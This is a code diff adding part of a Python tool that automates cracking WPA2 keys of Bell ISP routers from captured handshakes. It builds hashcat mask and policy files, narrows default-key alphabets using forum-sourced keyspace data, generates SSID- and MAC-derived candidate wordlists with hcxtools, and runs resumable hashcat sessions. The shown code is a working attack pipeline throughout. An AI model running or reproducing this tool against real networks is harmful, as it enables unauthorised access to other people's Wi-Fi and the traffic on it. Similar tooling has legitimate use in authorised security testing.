+        for observed in per_position:
+            if observed:
+                hybrid_sets.append(observed)
+            else:
+                hybrid_sets.append(class_chars(global_chars))
+        slots = _slot_assignment(hybrid_sets)
+        if slots and all(hybrid_sets):
+            charsets = unique(hybrid_sets)
+            mask = literal + "".join(f"?{slot}" for slot in slots)
+            variants.append(
+                MaskVariant(
+                    label=f"position-hybrid[{length}]{tag}",
+                    charsets=charsets,
+                    mask=mask,
+                    keyspace=_pow_size(charsets, slots),
+                    note="observed digits at their own positions, class elsewhere",
+                )
+            )
+
+        # 3. global-observed
+        if global_chars:
+            mask = literal + ("?1" * masked)
+            variants.append(
+                MaskVariant(
+                    label=f"global-observed[{length}]{tag}",
+                    charsets=[global_chars],
+                    mask=mask,
+                    keyspace=len(global_chars) ** masked,
+                    note="union of every character seen in this ESSID length group",
+                )
+            )
+    return variants
+
+
+def mask_file_line(charsets: Sequence[str], mask: str) -> str:
+    """Render one hashcat mask file line.
+
+    The format hashcat expects is a comma separated list whose last element
+    is the mask and whose preceding elements are the custom charsets for
+    ?1, ?2, ... (see the hashcat repository's masks/hashcat-default.hcmask).
+    A comma inside a charset would break the line, so it is removed.
+    """
+    parts = [cs.replace(",", "") for cs in charsets if cs]
+    return ",".join(parts + [mask])
+
+
+def write_mask_file(path: Path, charsets: Sequence[str], mask: str) -> Path:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(mask_file_line(charsets, mask) + "\n", encoding="utf-8")
+    return path
+
+
+# --------------------------------------------------------------------------
+# policy masks: the "intelligent rule" that removes the anti-candidates
+# --------------------------------------------------------------------------
+
+# A Bell WPA2 key is eight random characters over A-Z a-z 0-9, so it always
+# contains at least one lower case letter, one upper case letter and one
+# digit.  Requiring that removes the obvious anti-candidates
+# (aaaaaaaa, ssssssss, 99999999, aaaaAAAA, 9999aaaa, ...) for free, before
+# a single PBKDF2 iteration is spent on them.
+#
+# The same idea hashcat ships in masks/8char-1l-1u-1d-1s-compliant.hcmask:
+# one mask line per class assignment, each line carrying its own charsets.
+POLICY_CHARSETS: Dict[str, str] = {
+    "d": "0123456789",
+    "l": "abcdefghijklmnopqrstuvwxyz",
+    "u": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
+}
+POLICY_CLASSES = ("d", "l", "u")
+
+
+def build_policy_mask_file(
+    path: Path, length: int, classes: Sequence[str] = POLICY_CLASSES
+) -> Tuple[int, int]:
+    """Write the compliant policy mask file.
+
+    Every line is "<charset1>,<charset2>,...,<mask>"; hashcat reads the
+    comma separated list as the custom charsets with the mask last.  One
+    line is emitted per class assignment that uses every class at least
+    once, so the lines are disjoint and cover the compliant space exactly.
+
+    Returns (number of masks, keyspace).
+    """
+    classes = tuple(classes)
+    prefix = ",".join(POLICY_CHARSETS[c] for c in classes)
+    slot = {c: f"?{i + 1}" for i, c in enumerate(classes)}
+
+    combos: List[Tuple[str, Tuple[str, ...]]] = []
+    keyspace = 0
+    for combo in itertools.product(classes, repeat=length):
+        if set(combo) != set(classes):
+            continue
+        mask = "".join(slot[c] for c in combo)
+        size = 1
+        for c in combo:
+            size *= len(POLICY_CHARSETS[c])
+        keyspace += size
+        combos.append((mask, combo))
+
+    # cheapest masks first: more digits means a smaller charset per position
+    combos.sort(key=lambda item: (-sum(1 for c in item[1] if c == "d"), item[1]))
+
+    path.parent.mkdir(parents=True, exist_ok=True)
+    with path.open("w", encoding="utf-8") as fh:
+        for mask, _ in combos:
+            fh.write(f"{prefix},{mask}\n")
+    return len(combos), keyspace
+
+
+# --------------------------------------------------------------------------
+# anti-candidate rules for the wordlist phase
+# --------------------------------------------------------------------------
+
+KEYBOARD_WALKS = (
+    "qwertyuiop", "asdfghjkl", "zxcvbnm", "qwertzuiop", "asdfghjkl;",
+    "1234567890", "0987654321", "1qaz2wsx", "2wsx3edc", "qazwsxedc",
+    "1q2w3e4r", "zaq12wsx", "q1w2e3r4t5", "poiuytrewq", "mnbvcxzlkj",
+)
+COMMON_WORDS = (
+    "password", "qwerty", "letmein", "welcome", "admin", "iloveyou",
+    "sunshine", "princess", "football", "charlie", "monkey", "dragon",
+    "abc123", "trustno1", "master", "shadow", "michael", "jennifer",
+)
+
+
+def _has_run(candidate: str, size: int) -> bool:
+    """True when the candidate contains a run of `size` identical chars."""
+    run = 1
+    for i in range(1, len(candidate)):
+        if candidate[i] == candidate[i - 1]:
+            run += 1
+            if run >= size:
+                return True
+        else:
+            run = 1
+    return False
+
+
+def _has_sequence(candidate: str, size: int) -> bool:
+    """True when the candidate contains an ascending or descending run."""
+    run = 1
+    for i in range(1, len(candidate)):
+        delta = ord(candidate[i]) - ord(candidate[i - 1])
+        if delta in (1, -1):
+            run += 1
+            if run >= size:
+                return True
+        else:
+            run = 1
+    return False
+
+
+def anti_candidate_reasons(candidate: str) -> List[str]:
+    """Structural anti-candidates that are never worth a PBKDF2 iteration.
+
+    These are the patterns every password list already contains and that
+    no device would ever ship as a random key.
+    """
+    reasons: List[str] = []
+    if not candidate:
+        return ["empty"]
+    if len(set(candidate)) == 1:
+        reasons.append("single-character")
+    if _has_run(candidate, 4):
+        reasons.append("four-character-run")
+    for block in (2, 3, 4):
+        if len(candidate) % block == 0 and len(candidate) > block:
+            head = candidate[:block]
+            if head * (len(candidate) // block) == candidate:
+                reasons.append(f"repeated-{block}-block")
+                break
+    if _has_sequence(candidate, 4):
+        reasons.append("character-sequence")
+    lowered = candidate.lower()
+    for walk in KEYBOARD_WALKS:
+        if walk in lowered:
+            reasons.append("keyboard-walk")
+            break
+    for word in COMMON_WORDS:
+        if word in lowered:
+            reasons.append("common-word")
+            break
+    return reasons
+
+
+def filter_anti_candidates(
+    candidates: Iterable[str], log: Optional[Log] = None
+) -> Tuple[List[str], Dict[str, int]]:
+    """Drop the anti-candidates, reporting how many of each were removed."""
+    kept: List[str] = []
+    seen = set()
+    counts: Dict[str, int] = {}
+    for candidate in candidates:
+        if candidate in seen:
+            continue
+        seen.add(candidate)
+        reasons = anti_candidate_reasons(candidate)
+        if reasons:
+            for reason in reasons:
+                counts[reason] = counts.get(reason, 0) + 1
+            continue
+        kept.append(candidate)
+    if log and counts:
+        summary = ", ".join(f"{k}={v}" for k, v in sorted(counts.items()))
+        log(f"candidates: filtered {sum(counts.values())} anti-candidate(s): "
+            f"{summary}")
+    return kept, counts
+
+
+# --------------------------------------------------------------------------
+# documented default router keyspaces
+# --------------------------------------------------------------------------
+
+# The default keys that ISPs print on the hardware are not random over the
+# full alphabet, they are drawn from a restricted alphabet.  The canonical
+# list is the RouterKeySpaceWordlists project by 3mrgnc3, which hashcat's
+# own author (philsmd) quotes in the "Keyspace List for WPA on Default
+# Routers" thread on the hashcat forum:
+#
+#     BELL###   - [0-9A-F] Len: 8
+#     BELL####  - [0-9A-F] Len: 10
+#
+# A published recovery of a Bell Home Hub key (hack2know.how, 2019) shows
+# the same alphabet in practice: the key was "A2F7F579" for the SSID
+# "BELLXXX", eight upper case hexadecimal characters, cracked in two hours
+# on a GTX 1050 with "-1 ?dABCDEF ?1?1?1?1?1?1?1?1".
+#
+# 16^8 = 4,294,967,296 is about 50,800 times smaller than the full 62^8
+# alphanumeric space, which is what bridges the gap to a realistic attack.
+BELL_KEYSPACES: Tuple[Tuple[str, str, int], ...] = (
+    ("BELL###", "0-9A-F", 8),
+    ("BELL####", "0-9A-F", 10),
+)
+BELL_REAL_KEY_EXAMPLE = "A2F7F579"
+BELL_REAL_KEY_ESSID = "BELLXXX"
+
+# Default keyspace profiles tried first, cheapest first.  These are literal
+# character sets: the documented Bell generator alphabet and the two
+# case variants of it, plus the pure numeric case.
+#
+# The reduced keyspace comes from a calexico post on the hashcat forum
+# (2017-03-25, "Keyspace List for WPA on Default Routers"): on 275 Bell
+# handshakes the full 16 character alphabet (16^8) cracked 210 of them,
+# while a reduced 13 character alphabet (13^8) also cracked 210 of them.
+# The omitted characters are 0, 8 and B, presumably for readability, since
+# 0 looks like O and 8 like B.  The reduced alphabet is therefore tried
+# first, before the full one.
+# The reduced keyspace cannot be written as a charset spec because
+# "1-9" would be read as a range, so it is a literal constant.
+REDUCED_BELL_KEYSPACE = "12345679ACDEF"
+
+KEYSPACE_CHARSETS = (
+    "0123456789ABCDEF",    # 16 chars: the full documented Bell keyspace
+    "0123456789abcdef",    # 16 chars: hex, lower case
+    "0123456789ABCDEFabcdef",  # 32 chars: hex, mixed case
+    "0123456789",          # 10 chars: digits only
+)
+
+
+def keyspace_profiles(cfg: Config) -> List[Tuple[str, str, str]]:
+    """Return (name, literal charset, kind) triples for the mask chain.
+
+    "keyspace" marks the restricted, documented generator alphabets and
+    "alnum" the full alphanumeric fallback, which the "bell-first" order
+    hoists to the front.
+    """
+    profiles: List[Tuple[str, str, str]] = []
+
+    # The alphanumeric mask (Aa0-9) is the primary Bell attack and runs
+    # first, as requested. The documented/reduced hex keyspaces follow.
+    specs = cfg.get("mask_charsets") or []
+    if isinstance(specs, str):
+        specs = [specs]
+    for spec in specs:
+        charset = expand_charset(str(spec))
+        if not charset:
+            continue
+        slug = re.sub(r"[^A-Za-z0-9]+", "", str(spec)) or "cs"
+        if not any(c == charset for _, c, _ in profiles):
+            profiles.append((slug, charset, "alnum"))
+
+    profiles.append(("reduced-bell-13", REDUCED_BELL_KEYSPACE, "keyspace"))
+
+    literal = cfg.get("keyspace_charsets")
+    if isinstance(literal, str):
+        literal = [literal]
+    for charset in literal or list(KEYSPACE_CHARSETS):
+        charset = str(charset)
+        if not charset:
+            continue
+        slug = re.sub(r"[^A-Za-z0-9]+", "", charset) or "cs"
+        if not any(c == charset for _, c, _ in profiles):
+            profiles.append((slug, charset, "keyspace"))
+    return profiles
+
+
+def build_plan(
+    entries: Sequence[HashEntry],
+    cfg: Config,
+    hashes_path: Path,
+    speed: Optional[float],
+    masks_dir: Optional[Path] = None,
+) -> List[Step]:
+    """Build the ordered attack chain for the captured BELL hashes."""
+    prefix = str(cfg.get("ssid_prefix") or "BELL")
+    mask_len = int(cfg.get("mask_len") or 8)
+    charset = expand_charset(str(cfg.get("mask_charset") or "Aa0-9"))
+    order = str(cfg.get("mask_order") or "effective")
+
+    # Group the targets by length, but keep the preferred set (BELL7 by
+    # default) in front so its masks and candidates are tried first.
+    groups: Dict[Tuple[bool, int], List[str]] = {}
+    for entry in entries:
+        key = (is_preferred(entry.essid, cfg), len(entry.essid))
+        groups.setdefault(key, []).append(entry.essid)
+    by_length = {length: names for (_, length), names in groups.items()}
+    ordered_groups = [
+        names
+        for _, names in sorted(
+            groups.items(), key=lambda kv: (not kv[0][0], kv[0][1])
+        )
+    ]
+
+    steps: List[Step] = []
+
+    # The requested charsets. Only the free shape is used by default: the
+    # key is random, it does not start with the SSID prefix, and the policy
+    # mask file below covers the whole alphanumeric space with the
+    # anti-candidates removed.
+    use_prefix = bool(cfg.get("mask_prefix", True)) and bool(
+        cfg.get("include_prefixed", False)
+    )
+    tail = mask_len - len(prefix)
+    for slug, spec_chars, kind in keyspace_profiles(cfg):
+        if not spec_chars:
+            continue
+        shapes: List[Tuple[str, str, int, str]] = []
+        if use_prefix and prefix and tail >= 1:
+            shapes.append(
+                (
+                    "prefixed",
+                    prefix + ("?1" * tail),
+                    len(spec_chars) ** tail,
+                    f"{prefix} + {tail} characters",
+                )
+            )
+        if use_prefix and prefix:
+            shapes.append(
+                (
+                    "prefixed-full",
+                    prefix + ("?1" * mask_len),
+                    len(spec_chars) ** mask_len,
+                    f"{prefix} + {mask_len} characters",
+                )
+            )
+        shapes.append(
+            (
+                "free",
+                "".join(["?1"] * mask_len),
+                len(spec_chars) ** mask_len,
+                f"{mask_len} free characters",
+            )
+        )
+        for shape, mask, keyspace, description in shapes:
+            if len(mask) - mask.count("?") < PSK_MIN_LEN:
+                continue
+            if any(s.mask == mask and s.charsets == [spec_chars] for s in steps):
+                continue
+            steps.append(
+                Step(
+                    name=f"mask:requested-{mask_len}-{slug}-{shape}",
+                    kind="mask",
+                    desc=(
+                        f"requested {description} with charset {spec_chars}: "
+                        f"'{mask}'"
+                    ),
+                    group=kind,
+                    keyspace=keyspace,
+                    charsets=[spec_chars],
+                    mask=mask,
+                    hashes=hashes_path,
+                )
+            )
+
+    for essid_list in ordered_groups:
+        essids = sorted(set(essid_list))
+        length = len(essids[0])
+        group = f"len{length}"
+        if is_preferred(essids[0], cfg):
+            group += "-preferred"
+        if not cfg.get("include_evidence_masks", False):
+            continue
+        for variant in build_mask_variants(prefix, mask_len, charset, essids):
+            if len(variant.mask) < PSK_MIN_LEN:
+                continue
+            steps.append(
+                Step(
+                    name=f"mask:{variant.label}",
+                    kind="mask",
+                    desc=(
+                        f"{variant.label}: {variant.note}; mask '{variant.mask}' "
+                        f"over {len(essids)} ESSID(s)"
+                    ),
+                    group=group,
+                    keyspace=variant.keyspace,
+                    charsets=list(variant.charsets),
+                    mask=variant.mask,
+                    hashes=hashes_path,
+                )
+            )
+
+    # The policy mask file: eight random characters with at least one lower
+    # case letter, one upper case letter and one digit. This is the step
+    # that removes the anti-candidates (aaaaaaaa, ssssssss, 99999999,
+    # aaaaAAAA, 9999aaaa, ...) before they ever cost a PBKDF2 iteration.
+    policy_masks = 0
+    policy_keyspace = 0
+    if cfg.get("policy_masks", True) and masks_dir:
+        policy_file = masks_dir / "policy-8char-1l-1u-1d.hcmask"
+        policy_masks, policy_keyspace = build_policy_mask_file(
+            policy_file, mask_len
+        )
+        steps.append(
+            Step(
+                name=f"mask:policy-{mask_len}char-1l-1u-1d",
+                kind="mask",
+                desc=(
+                    f"policy mask file: {policy_masks} masks over "
+                    f"{mask_len} characters, at least one lower case letter, "
+                    f"one upper case letter and one digit; anti-candidates "
+                    f"such as aaaaaaaa, ssssssss, 99999999, aaaaAAAA and "
+                    f"9999aaaa are excluded by construction"
+                ),
+                group="policy",
+                keyspace=policy_keyspace,
+                mask_file=policy_file,
+                hashes=hashes_path,
+            )
+        )
+
+    if order in ("bell-first", "requested"):
+        # the full alphanumeric mask first, as requested, then everything
+        # else cheapest first
+        alnum = [s for s in steps if s.group == "alnum"]
+        rest = [s for s in steps if s.group != "alnum"]
+        rest.sort(key=lambda s: (s.keyspace or 0))
+        steps = alnum + rest
+    else:
+        steps.sort(key=lambda s: (s.keyspace or 0))
+
+    if masks_dir:
+        for step in steps:
+            if step.kind != "mask" or not step.mask:
+                continue
+            safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", step.name)
+            step.mask_file = write_mask_file(
+                masks_dir / f"{safe}.hcmask", step.charsets, step.mask
+            )
+
+    for step in steps:
+        if speed and speed > 0 and step.keyspace:
+            step.est_seconds = step.keyspace / speed
+    return steps
+
+
+# --------------------------------------------------------------------------
+# candidate wordlists
+# --------------------------------------------------------------------------
+
+
+def derived_candidates(
+    entries: Sequence[HashEntry], prefix: str, cfg: Optional[Config] = None
+) -> List[str]:
+    """SSID-derived candidates: the ESSID itself and close variants.
+
+    ISP routers frequently ship the SSID (or a direct derivative of it) as
+    the WiFi passphrase, so this list is worth far more than raw brute force.
+    Candidates shorter than PSK_MIN_LEN are dropped: WPA-PSK is 8..63
+    characters and hashcat's WPA kernels refuse anything shorter.
+    """
+    out: List[str] = []
+    seen = set()
+    dropped = 0
+
+    def add(value: str) -> None:
+        nonlocal dropped
+        if not value:
+            return
+        if len(value) < PSK_MIN_LEN:
+            dropped += 1
+            return
+        if value not in seen:
+            seen.add(value)
+            out.append(value)
+
+    ordered_entries = sorted(
+        entries, key=lambda e: (not is_preferred(e.essid, cfg), e.essid)
+    ) if cfg is not None else list(entries)
+    for entry in ordered_entries:
+        essid = entry.essid
+        stripped = essid[len(prefix) :] if essid.startswith(prefix) else essid
+        variants = [
+            essid,
+            essid.upper(),
+            essid.lower(),
+            essid.capitalize(),
+            essid.swapcase(),
+            stripped,
+            stripped.upper(),
+            stripped.lower(),
+            stripped.capitalize(),
+            stripped.swapcase(),
+            essid.replace("-", ""),
+            essid.replace("-", "").upper(),
+            essid.replace("_", ""),
+            essid.replace(" ", ""),
+        ]
+        for mac in (entry.bssid, entry.sta):
+            if mac and len(mac) == 12:
+                tail = mac[-8:]
+                variants.append(f"{prefix}{tail}")
+                variants.append(f"{prefix}{tail}".upper())
+        for variant in variants:
+            add(variant)
+    return out
+
+
+def build_candidate_wordlists(
+    entries: Sequence[HashEntry],
+    cfg: Config,
+    workdir: Path,
+    pcapng: Optional[Path],
+    log: Log,
+) -> Dict[str, Optional[Path]]:
+    """Build the derived/wordlist candidates using the official hcxtools."""
+    prefix = str(cfg.get("ssid_prefix") or "BELL")
+    cand_dir = workdir / "candidates"
+    cand_dir.mkdir(parents=True, exist_ok=True)
+    out: Dict[str, Optional[Path]] = {"derived": None, "hcxeiutool": None,
+                                      "hcxpsktool": None, "wordlist": None}
+
+    derived = derived_candidates(entries, prefix, cfg)
+    derived, _ = filter_anti_candidates(derived, log)
+    if derived:
+        path = cand_dir / "derived.txt"
+        path.write_text("\n".join(derived) + "\n", encoding="utf-8")
+        out["derived"] = path
+        log(f"candidates: {len(derived)} SSID-derived candidates -> {path}")
+
+    # Rule expansion: hashcat applies the official rule file to the derived
+    # base, exactly as the hcxtools documentation shows
+    # ("hashcat --stdout -r <rule> charlist"). The result is filtered with
+    # the same anti-candidate rules before it is cracked.
+    rule_file = str(cfg.get("rule_file") or "")
+    if (cfg.get("use_rules", True) and rule_file and derived
+            and Path(rule_file).exists()):
+        base = cand_dir / "rule_base.txt"
+        base.write_text("\n".join(derived) + "\n", encoding="utf-8")
+        # Use --force (CPU backend) to avoid broken OpenCL drivers that
+        # raise CL_INVALID_VALUE on some setups.
+        proc = run(
+            ["hashcat", "--stdout", "--force", "-r", rule_file, str(base)],
+            timeout=300,
+        )
+        if not (proc.returncode == 0 and proc.stdout.strip()):
+            proc = run(
+                ["hashcat", "--stdout", "-r", rule_file, str(base)],
+                timeout=300,
+            )
+        if proc.returncode == 0 and proc.stdout.strip():
+            expanded = [line for line in proc.stdout.splitlines() if line.strip()]
+            expanded, _ = filter_anti_candidates(expanded, log)
+            if expanded:
+                path = cand_dir / "rules.txt"
+                path.write_text("\n".join(expanded) + "\n", encoding="utf-8")
+                out["rules"] = path
+                log(f"candidates: {len(expanded)} rule-expanded candidates -> "
+                    f"{path}")
+        else:
+            log(f"candidates: rule expansion failed: "
+                f"{proc.stderr.strip()[:120]}", "warn")
+
+    # hcxeiutool derives digit / hex-digit / character / character-sequence
+    # patterns from the ESSIDs. The official workflow feeds it the -E output
+    # of hcxpcapngtool, which is autohex "$HEX[...]" and is skipped by
+    # hcxeiutool; plain ESSIDs are used here so the pattern extraction
+    # actually sees the characters.
+    essid_list = cand_dir / "essids.txt"
+    essids = sorted({e.essid for e in entries})
+    essid_list.write_text("\n".join(essids) + "\n", encoding="utf-8")
+
+    if cfg.get("use_hcxeiutool") and have("hcxeiutool") and entries:
+        digit = cand_dir / "hcx_digit.txt"
+        xdigit = cand_dir / "hcx_xdigit.txt"
+        chars = cand_dir / "hcx_chars.txt"
+        sclist = cand_dir / "hcx_sclist.txt"
+        # hcxeiutool opens its outputs in append mode, so stale content
+        # would accumulate between runs.
+        for stale in (digit, xdigit, chars, sclist):
+            try:
+                stale.unlink()
+            except OSError:
+                pass
+        proc = run(
+            [
+                "hcxeiutool",
+                "-i",
+                str(essid_list),
+                "-d",
+                str(digit),
+                "-x",
+                str(xdigit),
+                "-c",
+                str(chars),
+                "-s",
+                str(sclist),
+            ],
+            timeout=120,
+        )
+        if proc.returncode == 0:
+            merged = cand_dir / "hcxeiutool.txt"
+            parts = [digit, xdigit, chars, sclist]
+            with merged.open("w", encoding="utf-8") as out_fh:
+                for part in parts:
+                    if not part.exists():
+                        continue
+                    out_fh.write(part.read_text(encoding="utf-8", errors="replace"))
+                    out_fh.write("\n")
+            # sort -u, like the official workflow. The raw ESSID list is
+            # deliberately not merged in: hashcat's autohex would turn an
+            # all-hex ESSID such as "BEEF" into raw bytes.
+            unique = sorted(set(read_lines_text(merged)))
+            merged.write_text("\n".join(unique) + "\n", encoding="utf-8")
+            out["hcxeiutool"] = merged
+            log(f"candidates: hcxeiutool wordlist -> {merged}")
+        else:
+            log(f"candidates: hcxeiutool failed: {proc.stderr.strip()[:160]}",
+                "warn")
+
+    if cfg.get("use_hcxpsktool") and have("hcxpsktool") and entries:
+        psk = cand_dir / "hcxpsktool.txt"
+        hashes = cfg.get("_bell_hashes") or str(workdir / "bell.22000")
+        try:
+            psk.unlink()
+        except OSError:
+            pass
+        for entry in entries:
+            # hcxpsktool reads the hc22000 hash file (-c), not the capture
+            cmd = ["hcxpsktool", "-c", str(hashes), "-e", entry.essid]
+            if entry.bssid:
+                cmd += ["-b", entry.bssid.replace(":", "")]
+            cmd += ["-o", str(psk)]
+            if not cfg.get("hcxpsktool_full"):
+                # the complete weak-PSK list is ~140 MB and takes a minute;
+                # the access point MAC derived subset is what matters here
+                cmd.append("--maconly")
+            proc = run(cmd, timeout=300)
+            if proc.returncode != 0:
+                log(f"candidates: hcxpsktool failed: {proc.stderr.strip()[:120]}",
+                    "warn")
+                break
+        if psk.exists() and psk.stat().st_size:
+            # the tool requires a sorted unique list
+            unique = sorted(set(read_lines_text(psk)))
+            psk.write_text("\n".join(unique) + "\n", encoding="utf-8")
+            out["hcxpsktool"] = psk
+            log(f"candidates: hcxpsktool weak-PSK list -> {psk} "
+                f"({len(unique)} candidates)")
+
+    wordlist = str(cfg.get("wordlist") or "")
+    if wordlist and Path(wordlist).exists():
+        out["wordlist"] = Path(wordlist)
+    elif wordlist:
+        alt = Path(wordlist + ".gz")
+        if alt.exists():
+            target = cand_dir / "wordlist.txt"
+            if not target.exists():
+                import gzip
+
+                with gzip.open(alt, "rb") as src, target.open("wb") as dst:
+                    while True:
+                        chunk = src.read(1 << 20)
+                        if not chunk:
+                            break
+                        dst.write(chunk)
+            out["wordlist"] = target
+            log(f"candidates: decompressed wordlist -> {target}")
+    return out
+
+
+# --------------------------------------------------------------------------
+# hashcat runner
+# --------------------------------------------------------------------------
+
+# "Speed.#1.........:      948 H/s (66.78ms) @ Accel:64 ..." (benchmark)
+# and "Speed.#1: 4 H/s" (--speed-only) are both accepted.
+SPEED_RE = re.compile(r"Speed\.#\d+[.\s:]*([\d.]+)\s*([kMGT]?)H/s", re.IGNORECASE)
+
+
+def detect_speed(cfg: Config, workdir: Path, log: Log) -> Optional[float]:
+    """Measure hashcat mode 22000 throughput, capped to the core budget.
+
+    Every device is summed, so a machine with two GPUs reports the
+    combined rate, and the benchmark runs on the same devices the attack
+    will use.  The cached value is only reused when the configuration
+    that produced it has not changed.
+    """
+    override = cfg.get("hashcat_speed")
+    if override:
+        return float(override)
+
+    cores = max(1, int(cfg.get("hashcat_cores") or 2))
+    devices = str(cfg.get("hashcat_device_ids") or "")
+    cache = workdir / "speed.json"
+    cached = read_json(cache, None)
+    if (
+        isinstance(cached, dict)
+        and cached.get("speed")
+        and cached.get("cores") == cores
+        and str(cached.get("devices") or "") == devices
+    ):
+        return float(cached["speed"])
+
+    if not have("hashcat"):
+        return None
+
+    cmd = ["taskset", "-c", cores_spec(cores), "hashcat", "-b", "-m", "22000",
+           "--quiet"]
+    if devices:
+        cmd += ["-d", devices]
+    log("speed: benchmarking hashcat mode 22000 (capped to %d core(s))" % cores)
+    proc = run(cmd, timeout=180)
+    def _parse_speed(proc_obj: subprocess.CompletedProcess) -> float:
+        parsed = 0.0
+        for line in (proc_obj.stdout + proc_obj.stderr).splitlines():
+            for match in SPEED_RE.finditer(line):
+                value = float(match.group(1))
+                mult = {"": 1.0, "k": 1e3, "m": 1e6, "g": 1e9, "t": 1e12}
+                parsed += value * mult.get(match.group(2).lower(), 1.0)
+        return parsed
+
+    total = _parse_speed(proc)
+    # Broken OpenCL backends can report a tiny or zero rate; retry once with
+    # --force (CPU backend) before giving up.
+    if total < 100:
+        proc2 = run(cmd + ["--force"], timeout=180)
+        total2 = _parse_speed(proc2)
+        if total2 > total:
+            total = total2
+            proc = proc2
+    if total <= 0:
+        log("speed: benchmark produced no rate, assuming 3000 H/s", "warn")
+        return 3000.0
+    if total < 100:
+        log("speed: measured throughput is very low "
+            f"({total:,.0f} H/s) - hashcat is likely using a broken "
+            "OpenCL/CPU backend. Install GPU drivers or set "
+            "hashcat_speed in config to override.", "warn")
+    log(f"speed: {total:,.0f} H/s over all devices")
+    write_json(cache, {"speed": total, "cores": cores, "devices": devices,
+                       "at": time.strftime("%Y-%m-%dT%H:%M:%S")})
+    return total
+
+
+def cores_spec(cores: int) -> str:
+    cores = max(1, int(cores))
+    return f"0-{cores - 1}" if cores > 1 else "0"
+
+
+def hashcat_needs_force(log: Log) -> bool:
+    proc = run(["hashcat", "-I"], timeout=60)
+    blob = (proc.stdout + proc.stderr).lower()
+    return "no devices found" in blob or "unstable opencl driver" in blob
+
+
+@dataclass
+class StepResult:
+    name: str
+    status: str  # done | exhausted | skipped | error
+    detail: str = ""
+    cracked: List[Cracked] = field(default_factory=list)
+    elapsed: float = 0.0
+    log_path: Optional[Path] = None
+
+
+@dataclass
+class Cracked:
+    """A recovered passphrase together with the AP it belongs to."""
+
+    essid: str
+    bssid: str = ""
+    sta: str = ""
+    password: str = ""
+
+
+def show_cracked(hashes: Path, potfile: Path) -> List[Cracked]:
+    """Return the keys recovered for `hashes` from the potfile.
+
+    For mode 22000 hashcat's --show output is the canonical colon form
+    "<digest>:<ap>:<sta>:<essid>:<password>", not the raw hc22000 line.
+    """
+    out: List[Cracked] = []
+    if not hashes.exists():
+        return out
+    proc = run(
+        [
+            "hashcat",
+            "-m",
+            "22000",
+            "--show",
+            "--potfile-path",
+            str(potfile),
+            str(hashes),
+        ],
+        timeout=120,
+    )
+    for line in proc.stdout.splitlines():
+        line = line.strip()
+        if not line or ":" not in line:
+            continue
+        head, _, password = line.rpartition(":")
+        parts = head.split(":", 3)
+        if len(parts) < 2:
+            continue
+        out.append(
+            Cracked(
+                essid=parts[3] if len(parts) > 3 else "",
+                bssid=parts[1].replace(":", "").lower(),
+                sta=parts[2].replace(":", "").lower(),
+                password=password.strip(),
+            )
+        )
+    return out
+
+
+def save_terminal_state() -> None:
+    """Save curses + termios state before handing the tty to a subprocess."""
+    if curses is None:
+        return
+    try:
+        curses.def_prog_mode()
+    except Exception:
+        pass
+    try:
+        curses.savetty()
+    except Exception:
+        pass
+    try:
+        curses.flushinp()
+    except Exception:
+        pass
+
+
+def restore_terminal_state(stdscr=None) -> None:
+    """Restore curses + termios state after a subprocess returns."""
+    if curses is None:
+        return
+    try:
+        curses.reset_prog_mode()
+    except Exception:
+        pass
+    try:
+        curses.resetty()
+    except Exception:
+        pass
+    try:
+        curses.nocbreak()
+        curses.noraw()
+        curses.echo()
+        curses.nl()
+    except Exception:
+        pass
+    try:
+        curses.flushinp()
+    except Exception:
+        pass
+    try:
+        curses.curs_set(1)
+    except Exception:
+        pass
+    if stdscr is not None:
+        try:
+            stdscr.keypad(True)
+            stdscr.timeout(-1)
+            stdscr.nodelay(False)
+            stdscr.clear()
+            stdscr.refresh()
+        except Exception:
+            pass
+    try:
+        curses.doupdate()
+    except Exception:
+        pass
+
+
+def stop_running_step() -> bool:
+    """Terminate the hashcat process of the running step."""
+    global RUNNING_PROC
+    proc = RUNNING_PROC
+    if proc is None or proc.poll() is not None:
+        return False
+    try:
+        proc.terminate()
+        proc.wait(timeout=15)
+    except (OSError, subprocess.TimeoutExpired):
+        try:
+            proc.kill()
+        except OSError:
+            pass
+    return True
+
+
+def run_step(
+    step: Step,
+    cfg: Config,
+    workdir: Path,
+    log: Log,
+    potfile: Path,
+    force: bool,
+) -> StepResult:
+    """Execute one attack step under the configured resource budget."""
+    if step.skip_reason:
+        return StepResult(step.name, "skipped", step.skip_reason)
+
+    log_dir = workdir / "logs"
+    log_dir.mkdir(parents=True, exist_ok=True)
+    stamp = time.strftime("%Y%m%d-%H%M%S")
+    safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", step.name)
+    log_path = log_dir / f"{stamp}_{safe}.log"
+
+    cores = max(1, int(cfg.get("hashcat_cores") or 2))
+    raw_budget = cfg.get("max_hours_per_step")
+    if raw_budget:
+        budget_seconds = float(raw_budget) * 3600.0
+    else:
+        budget_seconds = None  # 0/None = unlimited
+
+    cmd = [
+        "taskset",
+        "-c",
+        cores_spec(cores),
+        "hashcat",
+        "-m",
+        "22000",
+        "-a",
+        "3" if step.kind == "mask" else "0",
+    ]
+    # A session lets an interrupted step resume instead of starting over,
+    # which matters for the multi-year alphanumeric mask.  hashcat takes a
+    # session *name* and keeps it under its data directory, so the data
+    # directory is redirected into the work directory.
+    session_name = f"bell-{safe}"
+    session_dir = workdir / "xdg" / "hashcat" / "sessions"
+    session_dir.mkdir(parents=True, exist_ok=True)
+    restore_file = session_dir / f"{session_name}.restore"
+    cmd += [
+        "--potfile-path",
+        str(potfile),
+        "--status",
+        "--status-timer",
+        "10",
+        "--quiet",
+        "--session",
+        session_name,
+    ]
+    if restore_file.exists():
+        cmd.append("--restore")
+        log(f"step '{step.name}': resuming the stored session")
+    if force:
+        cmd.append("--force")
+    device_ids = str(cfg.get("hashcat_device_ids") or "").strip()
+    if device_ids:
+        # -d selects the OpenCL device ids, e.g. "1,2" for two GPUs
+        cmd += ["-d", device_ids]
+    cmd.append(str(step.hashes))
+    if step.kind == "mask":
+        if step.mask_file and step.mask_file.exists():
+            # hashcat mask file: comma separated charsets, mask last
+            cmd.append(str(step.mask_file))
+        else:
+            for i, cs in enumerate(step.charsets):
+                cmd += [f"-{i + 1}", cs]
+            cmd.append(step.mask)
+    elif step.wordlist:
+        cmd.append(str(step.wordlist))
+
+    log(f"step '{step.name}': {' '.join(shlex.quote(c) for c in cmd)}")
+    started = time.time()
+    status = "exhausted"
+    detail = ""
